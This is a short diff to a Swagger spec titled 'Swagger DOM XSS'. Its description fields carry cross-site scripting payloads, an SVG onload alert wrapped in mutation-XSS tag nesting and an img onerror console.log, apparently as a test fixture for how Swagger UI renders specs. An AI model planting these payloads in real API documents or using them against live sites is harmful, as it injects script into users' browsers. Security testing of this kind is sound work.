@@ -1,7 +1,7 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <math><mtext><option><textarea><svg/onload='alert(1)'>
+  description: <math><mtext><option><textarea><svg/onload=alert(1)>
   termsOfService: "//gg.com"
   version: production
 basePath: /JSSResource/
@@ -19,7 +19,7 @@ paths:
       responses:
         '200':
           Type: string   
-          description: <h1>prints xss<img src=x%20onerror=console.log('haxxed');>
+          description: <h1>prints xss<img src=x%20onerror=console.log("haxxed");>
       tags:
         - accounts
       operationId: findAccounts
